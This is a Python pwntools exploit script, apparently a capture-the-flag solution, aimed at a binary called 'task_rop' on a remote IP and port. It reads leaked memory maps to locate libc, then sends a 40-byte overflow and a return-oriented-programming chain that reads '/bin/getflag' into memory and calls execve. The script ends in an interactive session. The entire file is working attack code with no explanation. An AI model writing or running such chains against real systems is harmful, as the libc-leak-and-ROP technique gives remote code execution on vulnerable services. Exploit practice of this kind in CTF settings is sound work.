#!/usr/bin/env python3
from pwn import *

context.binary = e = ELF("./task_rop", checksec=False)
libc = ELF("./libc-2.31.so", checksec=False)
context.log_level = "info"
HOST, PORT = "109.233.56.90", 11652

POP_RDI = 0x400803
POP_RSI_R15 = 0x400801
RET = 0x400536
READ_PLT = 0x400570
BSS = 0x601090
OFF = 40

io = remote(HOST, PORT)

data = io.recvrepeat(1.5)
text = data.decode(errors="replace")
libc_base = None
for line in text.splitlines():
    if "libc" in line and "-" in line.split()[0]:
        start = int(line.split("-")[0], 16)
        libc_base = start if libc_base is None else min(libc_base, start)
if libc_base is None:
    log.error("не нашёл libc в maps:\n" + text[:2000])
libc.address = libc_base
log.success("libc base = %#x", libc.address)
assert libc.address & 0xfff == 0

POP_RDX = libc.address + 0xcb28d
execve = libc.sym.execve
log.success("execve = %#x pop_rdx = %#x", execve, POP_RDX)

path = b"/bin/getflag\x00"

r = flat(
    b"A"*OFF,
    POP_RDI, 0,
    POP_RSI_R15, BSS, 0,
    POP_RDX, 0x20,
    READ_PLT,
    POP_RDI, BSS,
    POP_RSI_R15, 0, 0,
    POP_RDX, 0,
    RET,
    execve,
)
io.send(r)
io.send(path)

print(io.recvrepeat(3).decode(errors="replace"))
io.interactive()
